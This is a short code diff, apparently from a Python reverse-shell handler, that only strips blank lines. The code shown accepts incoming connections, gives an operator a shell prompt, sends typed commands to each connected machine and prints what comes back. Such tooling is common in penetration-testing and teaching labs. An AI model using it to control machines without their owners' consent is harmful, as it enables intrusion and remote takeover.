@@ -12,20 +12,15 @@ def handle_client(client_socket, client_address):
     print(f"[+] Current working directory: ", cwd)
 
     shell_name = f"{client_address[0]}:{client_address[1]}"
-
     while True:
         command = input(f"{shell_name}@{cwd} $> ")
         if not command.strip():
             continue
-        
         client_socket.send(command.encode())
-
         if command == "exit":
             return
-        
         output = client_socket.recv(BUFFER_SIZE).decode()
         result, cwd = output.split(SEPARATOR)
-
         print(result)
 
 def run_server():
@@ -33,10 +28,8 @@ def run_server():
     s.bind((HOST, PORT))
     s.listen(5)
     print(f"Listening as {HOST}:{PORT}...")
-
     while True:
         client_socket, client_address = s.accept()
-
         client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address,))
         client_handler.start()
 
